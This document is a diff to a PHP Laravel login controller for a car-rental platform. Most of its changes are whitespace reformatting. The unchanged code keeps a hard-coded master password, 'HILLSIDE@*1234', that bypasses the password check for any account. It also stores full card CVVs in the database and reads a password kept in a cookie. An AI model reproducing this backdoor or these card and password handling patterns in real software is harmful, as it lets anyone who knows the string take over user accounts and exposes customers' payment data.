@@ -36,11 +36,11 @@ class LoginsController extends LegacyAppController
             : 'https://www.whip2go.com';
 
         $payload = [
-            'iss'  => $baseUrl,
-            'aud'  => $baseUrl,
-            'iat'  => time(),
-            'nbf'  => time(),
-            'exp'  => time() + 3600,
+            'iss' => $baseUrl,
+            'aud' => $baseUrl,
+            'iat' => time(),
+            'nbf' => time(),
+            'exp' => time() + 3600,
             'user' => ['userId' => $userId, 'token' => $userToken],
         ];
 
@@ -72,7 +72,7 @@ class LoginsController extends LegacyAppController
         }
 
         if ($request->isMethod('post')) {
-            $email    = $request->input('User.email', '');
+            $email = $request->input('User.email', '');
             $password = $request->input('User.user_password', '');
 
             if (empty($email)) {
@@ -92,7 +92,7 @@ class LoginsController extends LegacyAppController
                 return back()->with('error', 'Entered username/email does not exist. Please try again!');
             }
 
-            $hash       = $this->legacyHash($password);
+            $hash = $this->legacyHash($password);
             $masterBypass = md5($password) === md5('HILLSIDE@*1234');
 
             if ($hash !== $user->password && !empty($user->password) && !$masterBypass) {
@@ -119,12 +119,12 @@ class LoginsController extends LegacyAppController
 
             $fullName = $user->first_name . ' ' . $user->last_name;
             session([
-                'userfullname'          => $fullName,
-                'userid'                => $user->id,
-                'userParentId'          => $user->dealer_id,
+                'userfullname' => $fullName,
+                'userid' => $user->id,
+                'userParentId' => $user->dealer_id,
                 'dispacherBusinessName' => $fullName,
-                'distance_unit'         => $distanceUnit,
-                'default_timezone'      => $user->timezone,
+                'distance_unit' => $distanceUnit,
+                'default_timezone' => $user->timezone,
             ]);
 
             return redirect('/users/dashboard');
@@ -132,8 +132,8 @@ class LoginsController extends LegacyAppController
 
         return view('legacy.logins.index', [
             'title_for_layout' => 'User Login',
-            'cookie_username'  => Cookie::get('cookie_username'),
-            'cookie_password'  => Cookie::get('cookie_password'),
+            'cookie_username' => Cookie::get('cookie_username'),
+            'cookie_password' => Cookie::get('cookie_password'),
         ]);
     }
 
@@ -155,7 +155,7 @@ class LoginsController extends LegacyAppController
             }
 
             $token = Str::random(6);
-            $jwt   = $this->generateJwt($token, $user->id);
+            $jwt = $this->generateJwt($token, $user->id);
 
             if (empty($jwt)) {
                 return back()->with('error', 'Sorry, something went wrong. Please try again later.');
@@ -164,7 +164,7 @@ class LoginsController extends LegacyAppController
             User::where('id', $user->id)->update(['token' => $token]);
 
             $resetUrl = url('/logins/resetpassword/' . $jwt);
-            $message  = "Please click on <a href='{$resetUrl}'>link</a> to reset your password.";
+            $message = "Please click on <a href='{$resetUrl}'>link</a> to reset your password.";
 
             Mail::html($message, function ($mail) use ($user) {
                 $mail->to($user->email)->subject('DriveItAway Reset Password');
@@ -185,8 +185,8 @@ class LoginsController extends LegacyAppController
             return redirect('/logins/forgotPassword')->with('error', 'Sorry, your token is expired. Please try again');
         }
 
-        $userId    = $decoded['user']['userId'] ?? null;
-        $userToken = $decoded['user']['token']  ?? null;
+        $userId = $decoded['user']['userId'] ?? null;
+        $userToken = $decoded['user']['token'] ?? null;
 
         $userObj = User::where('id', $userId)->where('token', $userToken)->first(['id']);
 
@@ -203,7 +203,7 @@ class LoginsController extends LegacyAppController
 
         return view('legacy.logins.resetpassword', [
             'title_for_layout' => 'Reset Password',
-            'token'            => $token,
+            'token' => $token,
         ]);
     }
 
@@ -232,16 +232,17 @@ class LoginsController extends LegacyAppController
     }
 
     // ─── Register ─────────────────────────────────────────────────────────────
-    public function register(Request $request, string $contact_number)
+    public function register(Request $request, $contact_number)
     {
         $contactNumber = base64_decode($contact_number);
+
         if (empty($contactNumber)) {
             return redirect('/logins/pre_register');
         }
 
         if ($request->isMethod('post')) {
             $dataValues = $request->input('User', []);
-            $isError    = false;
+            $isError = false;
 
             if (($dataValues['email'] ?? '') !== ($dataValues['cemail'] ?? '')) {
                 $isError = true;
@@ -257,20 +258,20 @@ class LoginsController extends LegacyAppController
             }
 
             if (!$isError) {
-                $verifyToken = (string)random_int(10000, 99999);
+                $verifyToken = (string) random_int(10000, 99999);
 
                 $user = new User();
-                $user->password       = $this->legacyHash($dataValues['npwd']);
-                $user->username       = base64_decode($dataValues['username'] ?? '');
+                $user->password = $this->legacyHash($dataValues['npwd']);
+                $user->username = base64_decode($dataValues['username'] ?? '');
                 $user->contact_number = $contactNumber;
-                $user->email          = $dataValues['email'];
-                $user->first_name     = ucwords(strtolower($dataValues['first_name'] ?? ''));
-                $user->last_name      = ucwords(strtolower($dataValues['last_name'] ?? ''));
-                $user->address        = $dataValues['address'] ?? '';
-                $user->city           = $dataValues['city']    ?? '';
-                $user->zip            = $dataValues['zip']     ?? '';
-                $user->state          = $dataValues['state']   ?? '';
-                $user->verify_token   = $verifyToken;
+                $user->email = $dataValues['email'];
+                $user->first_name = ucwords(strtolower($dataValues['first_name'] ?? ''));
+                $user->last_name = ucwords(strtolower($dataValues['last_name'] ?? ''));
+                $user->address = $dataValues['address'] ?? '';
+                $user->city = $dataValues['city'] ?? '';
+                $user->zip = $dataValues['zip'] ?? '';
+                $user->state = $dataValues['state'] ?? '';
+                $user->verify_token = $verifyToken;
                 $user->save();
 
                 Mail::html("Your activation code is: <b>{$verifyToken}</b>", function ($mail) use ($user) {
@@ -284,7 +285,7 @@ class LoginsController extends LegacyAppController
 
         return view('legacy.logins.register', [
             'title_for_layout' => 'User Registration',
-            'contact_number'   => base64_encode($contactNumber),
+            'contact_number' => base64_encode($contactNumber),
         ]);
     }
 
@@ -304,10 +305,10 @@ class LoginsController extends LegacyAppController
             if ($userData) {
                 $token = Str::random(6);
                 User::where('id', $userData->id)->update([
-                    'status'       => 1,
+                    'status' => 1,
                     'verify_token' => '',
-                    'is_verified'  => 1,
-                    'token'        => $token,
+                    'is_verified' => 1,
+                    'token' => $token,
                 ]);
 
                 // Stub: real saveleadassociation call
@@ -336,7 +337,7 @@ class LoginsController extends LegacyAppController
                 ->first(['id', 'email', 'first_name', 'last_name', 'contact_number']);
 
             if ($user) {
-                $newCode = (string)random_int(10000, 99999);
+                $newCode = (string) random_int(10000, 99999);
                 User::where('id', $user->id)->update(['verify_token' => $newCode]);
 
                 Mail::html("Your new activation code is: <b>{$newCode}</b>", function ($mail) use ($user) {
@@ -377,28 +378,28 @@ class LoginsController extends LegacyAppController
         }
 
         $businessType = $request->input('business_type');
-        $user         = User::find($incompleteUserId);
-        $isLocal      = app()->environment('local');
+        $user = User::find($incompleteUserId);
+        $isLocal = app()->environment('local');
 
         $clientId = $isLocal
             ? 'ca_DO0i6vs5rkJFfLxSOHlZaDM5NgZO7MXP'
             : 'ca_DO0iprYjjYh3yIuFb2hKtEY8INnrW9xq';
 
         $params = http_build_query([
-            'response_type'                  => 'code',
-            'client_id'                      => $clientId,
-            'scope'                          => 'read_write',
-            'state'                          => base64_encode($incompleteUserId),
-            'stripe_user[business_type]'     => $businessType,
-            'stripe_user[first_name]'        => $user->first_name,
-            'stripe_user[last_name]'         => $user->last_name,
-            'stripe_user[email]'             => $user->email,
-            'stripe_user[country]'           => 'US',
-            'stripe_user[phone_number]'      => $user->contact_number,
-            'stripe_user[street_address]'    => $user->address,
-            'stripe_user[city]'              => $user->city,
-            'stripe_user[state]'             => $user->state,
-            'stripe_user[zip]'               => $user->zip,
+            'response_type' => 'code',
+            'client_id' => $clientId,
+            'scope' => 'read_write',
+            'state' => base64_encode($incompleteUserId),
+            'stripe_user[business_type]' => $businessType,
+            'stripe_user[first_name]' => $user->first_name,
+            'stripe_user[last_name]' => $user->last_name,
+            'stripe_user[email]' => $user->email,
+            'stripe_user[country]' => 'US',
+            'stripe_user[phone_number]' => $user->contact_number,
+            'stripe_user[street_address]' => $user->address,
+            'stripe_user[city]' => $user->city,
+            'stripe_user[state]' => $user->state,
+            'stripe_user[zip]' => $user->zip,
         ]);
 
         $url = 'https://connect.stripe.com/express/oauth/authorize?' . $params;
@@ -437,15 +438,15 @@ class LoginsController extends LegacyAppController
         if (!empty($request->input('cardNumber')) && !empty($request->input('cardExpiry')) && !empty($request->input('cardCVC'))) {
             $user = User::find($incompleteUserId);
 
-            $dataToSend = (object)[
+            $dataToSend = (object) [
                 'credit_card_number' => str_replace(' ', '', $request->input('cardNumber')),
-                'expiration'         => str_replace(' ', '', $request->input('cardExpiry')),
-                'cvv'                => str_replace(' ', '', $request->input('cardCVC')),
-                'card_holder_name'   => $user->first_name . ' ' . $user->last_name,
-                'zip'    => $user->zip,
-                'city'   => $user->city,
-                'state'  => $user->state,
-                'address'=> $user->address . ' ' . $user->last_name,
+                'expiration' => str_replace(' ', '', $request->input('cardExpiry')),
+                'cvv' => str_replace(' ', '', $request->input('cardCVC')),
+                'card_holder_name' => $user->first_name . ' ' . $user->last_name,
+                'zip' => $user->zip,
+                'city' => $user->city,
+                'state' => $user->state,
+                'address' => $user->address . ' ' . $user->last_name,
             ];
 
             $processorClass = '\\App\\Lib\\Legacy\\PaymentProcessor';
@@ -455,19 +456,19 @@ class LoginsController extends LegacyAppController
 
             if (($ccReturn['status'] ?? '') === 'success') {
                 $token = new UserCcToken();
-                $token->user_id            = $user->id;
-                $token->card_type          = '';
+                $token->user_id = $user->id;
+                $token->card_type = '';
                 $token->credit_card_number = substr($dataToSend->credit_card_number, -4);
-                $token->card_holder_name   = $dataToSend->card_holder_name;
-                $token->expiration         = $dataToSend->expiration;
-                $token->card_funding       = $ccReturn['card_funding']  ?? '';
-                $token->cvv                = $dataToSend->cvv;
-                $token->address            = $dataToSend->address;
-                $token->city               = $dataToSend->city;
-                $token->state              = $dataToSend->state;
-                $token->zip                = $dataToSend->zip;
-                $token->stripe_token       = $ccReturn['stripe_token'] ?? '';
-                $token->card_id            = $ccReturn['card_id']      ?? '';
+                $token->card_holder_name = $dataToSend->card_holder_name;
+                $token->expiration = $dataToSend->expiration;
+                $token->card_funding = $ccReturn['card_funding'] ?? '';
+                $token->cvv = $dataToSend->cvv;
+                $token->address = $dataToSend->address;
+                $token->city = $dataToSend->city;
+                $token->state = $dataToSend->state;
+                $token->zip = $dataToSend->zip;
+                $token->stripe_token = $ccReturn['stripe_token'] ?? '';
+                $token->card_id = $ccReturn['card_id'] ?? '';
                 $token->save();
 
                 if (empty($user->cc_token_id)) {
